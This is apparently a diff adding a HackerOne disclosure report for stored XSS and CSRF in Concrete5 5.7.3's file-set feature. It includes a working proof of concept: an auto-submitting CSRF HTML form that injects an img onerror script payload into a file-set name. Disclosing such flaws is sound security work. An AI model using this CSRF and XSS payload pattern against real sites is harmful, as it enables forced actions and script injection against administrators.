@@ -1,0 +1,56 @@
+# HackerOne Report: Stored XSS in adding fileset
+**Report ID:** 42248
+**Vulnerability Class:** Cross-site Scripting (XSS) - Generic
+
+## Vulnerability Information & PoC
+Hello
+I found XSS and CSRF in Concrete5 5.7.3
+Adding fileset function have CSRF vuln so I think easy to attack.
+
+PoC is below
+
+1.Upload one file in file manager
+(/conc/index.php/dashboard/files)
+
+2.Open the page like this
+---------------------
+<html><head>
+<meta http-equiv='content-type' content='text/html; charset=Shift_JIS'></head><body>
+<h3>http://172.20.0.49/conc573/index.php/tools/required/files/add_to</h3>
+<form id='f1' method='POST' action='http://172.20.0.49/conc573/index.php/tools/required/files/add_to'>
+ <table>
+ <tr><td>
+task=<td><input name='task' value='add_to_sets' size='100'></tr>
+<tr><td>
+fID[]=<td><input name='fID[]' value='1' size='100'></tr>
+<tr><td>
+fsNew=<td><input name='fsNew' value='1' size='100'></tr>
+<tr><td>
+fsNewText=<td><input name='fsNewText' value='"><img src=0 onerror=alert(location)>' size='100'></tr>
+<tr><td>
+fsNewShare=<td><input name='fsNewShare' value='1' size='100'></tr>
+<tr><td>
+fsID%3A1=<td><input name='fsID;1' value='2' size='100'></tr>
+</table>
+</form>
+<button onload='document.getElementById('f1').submit()'>Submit</button>
+</body></html>
+------------------------
+(concrete5filesetxssfig-01.png)
+
+This page automatically send post request and 
+ add to file set "><img src=0 onerror=alert(location)> to file_id 1
+
+(concrete5filesetxssfig-02.png)
+
+3. Open the Fileset page
+(conc/index.php/dashboard/files/sets)
+and alert
+
+(concrete5filesetxssfig-03.png)
+
+I tested to work on Ammps on Windows7
+Regards.
+
+
+## Discussion & Remediation Timeline
